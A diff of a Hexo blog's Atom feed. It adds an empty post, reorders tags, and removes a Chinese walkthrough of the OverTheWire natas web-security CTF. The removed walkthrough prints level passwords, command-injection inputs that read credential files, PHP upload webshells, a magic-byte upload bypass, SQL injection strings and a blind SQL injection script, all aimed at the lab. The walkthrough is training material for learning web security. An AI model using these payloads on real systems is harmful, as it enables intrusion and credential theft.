@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-07-23T14:16:57.881Z</updated>
+  <updated>2019-03-17T14:33:58.298Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,20 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>写给以后</title>
+    <link href="http://yoursite.com/uncategorized/2019/03/17/%E5%86%99%E7%BB%99%E4%BB%A5%E5%90%8E.html"/>
+    <id>http://yoursite.com/uncategorized/2019/03/17/写给以后.html</id>
+    <published>2019-03-17T14:33:58.000Z</published>
+    <updated>2019-03-17T14:33:58.298Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>科学上网</title>
@@ -87,9 +101,9 @@
       <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
     
     
-      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
       <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
@@ -1592,58 +1606,6 @@ expect:// — 处理交互式的流
     
     
       <category term="杂谈" scheme="http://yoursite.com/tags/%E6%9D%82%E8%B0%88/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>natas通关手册</title>
-    <link href="http://yoursite.com/CTF/2017/03/18/natas%E9%80%9A%E5%85%B3%E6%89%8B%E5%86%8C.html"/>
-    <id>http://yoursite.com/CTF/2017/03/18/natas通关手册.html</id>
-    <published>2017-03-18T09:12:44.000Z</published>
-    <updated>2017-04-02T07:29:10.401Z</updated>
-    
-    <content type="html"><![CDATA[<p>前几天看博客发现了一个很不错的网站，natas overthewire是一个和web安全相关的CTF网站，题目设计的还是很精巧的，很值得我们这些学习web安全的做一做。<br>地址：<a href="http://overthewire.org/wargames/natas/" target="_blank" rel="external">http://overthewire.org/wargames/natas/</a></p>
-<p><strong>level 0</strong><br>直接查看源代码，即可从注释中看到密码；<a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt;</div></pre></td></tr></table></figure></p>
-<p><strong>level 1</strong><br>登录进去发现禁止右键，但是可以F12进行审查元素或者查看源代码快捷方式<strong><em>Ctrl+U</em></strong>，密码还是在注释里面。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt;</div></pre></td></tr></table></figure></p>
-<p><strong>level 2</strong><br>查看源代码什么也没有发现，就发现有一张图片，想想看看能不能查看files这个目录，结果files目录没有禁止访问，发现files目录下有一个uesrs.txt，打开就有密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</div></pre></td></tr></table></figure></p>
-<p><strong>level 3</strong><br>也是第一反应查看原代码，可是并没有提示。注意这里，Not even google will find it ，说明搜索引擎不会抓取这个相关的页面，说明存在robots.txt。访问之<a href="http://natas3.natas.labs.overthewire.org/robots.txt发现一个s3cr3t的目录打开发现一个users.txt" target="_blank" rel="external">http://natas3.natas.labs.overthewire.org/robots.txt发现一个s3cr3t的目录打开发现一个users.txt</a> 得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</div></pre></td></tr></table></figure></p>
-<p><strong>level 4</strong><br>页面提示<strong><em>You are visiting from “<a href="http://natas4.natas.labs.overthewire.org/index.php" target="_blank" rel="external">http://natas4.natas.labs.overthewire.org/index.php</a>“ while authorized users should come only from “<a href="http://natas5.natas.labs.overthewire.org/" target="_blank" rel="external">http://natas5.natas.labs.overthewire.org/</a>“ </em></strong>，需要我们从natas5页面来访问natas4的页面，我们可以使用burp抓包，增加一个Referer头来指定当前页面来自哪里，即可得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</div></pre></td></tr></table></figure></p>
-<p><strong>level 5</strong><br>发现是一个登录界面，但是提示你没有登录，可以burp抓包进行查看。一般登录验证身份或者状态都是通过cookie，发现cookie参数的一个loggedin的值为0.试着改为1试试看，提示登录成功，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div></pre></td></tr></table></figure></p>
-<p><strong>level 6</strong><br>登录发现是一个post提交的地方，还可以查看源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line"></div><div class="line">include &quot;includes/secret.inc&quot;;</div><div class="line"></div><div class="line">    if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</div><div class="line">        if($secret == $_POST[&apos;secret&apos;]) &#123;</div><div class="line">        print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">        print &quot;Wrong secret&quot;;</div><div class="line">    &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>大体就是提交一个数字与include文件里的内容进行对比。尝试访问includes/secret.inc，竟然明晃晃的$secret = “FOEIUWGHFEEUHOFUOIU”;，那么直接输入进去就可以得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</div></pre></td></tr></table></figure></p>
-<p><strong>level 7</strong><br>登录进去就两个没有什么内容的链接，但是链接很有意思?page=home和?page=home，还有提示<strong><em>hint: password for webuser natas8 is in /etc/natas_webpass/natas8</em></strong>，那肯定就是目录遍历咯，?page=/etc/natas_webpass/natas8，得到密码；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</div></pre></td></tr></table></figure></p>
-<p><strong>level 8</strong><br>登录进去发现又是一个post提交的表单，查看关键代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line"></div><div class="line">$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;</div><div class="line"></div><div class="line">function encodeSecret($secret) &#123;</div><div class="line">    return bin2hex(strrev(base64_encode($secret)));</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;submit&quot;, $_POST)) &#123;</div><div class="line">    if(encodeSecret($_POST[&apos;secret&apos;]) == $encodedSecret) &#123;</div><div class="line">    print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">    print &quot;Wrong secret&quot;;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>bin2hex函数 将二进制数据转换成十六进制表示<br>strrev() 函数反转字符串<br>已经告诉了我们encodedSecret的值，以及加密方式已经给出，我们可以到着密码方式来，这样可以得到我们需要输入的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo base64_decode(strrev(hex2bin(&quot;3d3d516343746d4d6d6c315669563362&quot;)));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>得到oubWYf2kBq，输入直接得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</div></pre></td></tr></table></figure></p>
-<p><strong>level 9</strong><br>登录发现又是一个输入框，查看关键代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">$key = &quot;&quot;;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</div><div class="line">    $key = $_REQUEST[&quot;needle&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($key != &quot;&quot;) &#123;</div><div class="line">    passthru(&quot;grep -i $key dictionary.txt&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>发现passthru()函数，它同exec()函数system()函数类似, 也是用来执行外部命令(command)的。提交的参数作为$key执行grep -i $key dictionary.txt命令，想到肯定是命令执行漏洞了。<br>首先就是截断grep命令，可是使用;进行截断，然后根据前面目录遍历的思路查看/etc/natas_webpass/natas9文件，即输入;cat /etc/natas_webpass/natas10 #，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</div></pre></td></tr></table></figure></p>
-<p><strong>level 10</strong><br>和上一个题目差不多，但就是过滤了; | &amp; 三个符号，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line">$key = &quot;&quot;;</div><div class="line"></div><div class="line">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) &#123;</div><div class="line">    $key = $_REQUEST[&quot;needle&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">if($key != &quot;&quot;) &#123;</div><div class="line">    if(preg_match(&apos;/[;|&amp;]/&apos;,$key)) &#123;</div><div class="line">        print &quot;Input contains an illegal character!&quot;;</div><div class="line">    &#125; else &#123;</div><div class="line">        passthru(&quot;grep -i $key dictionary.txt&quot;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>不能够截断grep了，只能使用grep进行搜索了，根据前面做的题目一直密码都是大小写，我们可以搜索大小字母得到密码，即输入[a-zA-Z] /etc/natas_webpass/natas11 #或者匹配所有.*  /etc/natas_webpass/natas11 #，得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</div></pre></td></tr></table></figure></p>
-<p><strong>level 11</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</div></pre></td></tr></table></figure></p>
-<p><strong>level 12</strong><br>登录发现是一道文件上传类型的题目，查看源代码，发现并未设置文件类型检测，上传后还会告诉我们路径，那么直接上传一个php文件，然后根据路径访问得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    passthru(&apos;cat /etc/natas_webpass/natas13&apos;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>刚开始的时候一直被重命名为jpg，一直很懵逼，然后抓包发现参数k24yezk2tm.jpg，就试着修改为k24yezk2tm.php，则上传上去的就会重名为.php文件。<br><img src="http://p1.bpimg.com/567571/2267a96ab65a6d24.jpg" alt=""></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</div></pre></td></tr></table></figure>
-<p><strong>level 13</strong><br>登录可以看到使用exif_imagetype()来读取文件的第一个字节并检查其签名，判断是否为图像类型说明。<br>那么我们可以在php文件前面添加上jpg图像的前几个字节用来逃避exif_imagetype()函数的验证。其他过程和第一步类似。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GIF89a</div><div class="line">&lt;?php  </div><div class="line">    passthru(&apos;cat /etc/natas_webpass/natas14&apos;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>得到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</div></pre></td></tr></table></figure></p>
-<p><strong>level 14</strong><br>登录进去是一个登录界面，第一反应就是试试常见的登录名、密码等弱口令，第二个就是万能密码，第三就是进行注入了，登录名随便，密码为<strong><em>” OR 1=1 #</em></strong>，即可登录成功拿到密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</div></pre></td></tr></table></figure></p>
-<p><strong>level 15</strong><br>登录进去也是一个登录的界面，随便输入都是一样的错误提示，当我们输入natas16的时候它会提示用户存在，只给了一个能够判断用户是否存在的东西因此只有通过爆破来攻击。可能我们下一关的用户名和密码存储在数据库中，可以通过错误的提示来判断查询的结果，得出密码。采用sql盲注的技术。<br>查看源代码查询语句为<strong><em>$query = “SELECT </em> from users where username=\””.$_REQUEST[“username”].”\””;*</strong>，我们可以构造查询password的语句，通过查询的结果盲注出密码。即输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * from users where username=\&quot;natas16\&quot; and 32 &lt; ascii(mid(password,1,1)) and \&quot;\&quot; like \&quot;\&quot;</div></pre></td></tr></table></figure></p>
-<p>sql盲注脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"></div><div class="line">import requests</div><div class="line">url = &apos;http://natas15.natas.labs.overthewire.org/index.php&apos;</div><div class="line">username = &apos;natas15&apos;</div><div class="line">password = &apos;AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J&apos;</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pwd in range(34):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (low+high)&gt;&gt;1  #使用二分法快速查找   </div><div class="line">    </div><div class="line">    while mid&lt;high:</div><div class="line">        #构造查询password来进行匹配</div><div class="line">        payload=&quot; natas16\&quot; and %d &lt; ascii(mid(password,%d,1)) and \&quot;\&quot; like \&quot;&quot; %(mid,pwd)</div><div class="line">        req = requests.post(url, auth = requests.auth.HTTPBasicAuth(username,password),data=&#123;&quot;username&quot;:payload&#125;)</div><div class="line">        #对返回结果进行判断 </div><div class="line">        if req.text.find(&quot;doesn&apos;t exist&quot;)==-1: </div><div class="line">            low = mid+1</div><div class="line">        else:</div><div class="line">            high=mid   </div><div class="line">        mid = (high+low)&gt;&gt;1  #继续二分进行查找</div><div class="line">        </div><div class="line">    key+=chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure></p>
-<p>这样就会根据盲注脚本找到密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</div></pre></td></tr></table></figure></p>
-<p><strong>level 16</strong></p>
-<p><strong>level 17</strong></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;前几天看博客发现了一个很不错的网站，natas overthewire是一个和web安全相关的CTF网站，题目设计的还是很精巧的，很值得我们这些学习web安全的做一做。&lt;br&gt;地址：&lt;a href=&quot;http://overthewire.org/wargames/natas/&quot;&gt;http://overthewire.org/wargames/natas/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;level 0&lt;/strong&gt;&lt;br&gt;直接查看源代码，即可从注释中看到密码；
-    
-    </summary>
-    
-      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
-    
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
     
   </entry>
   
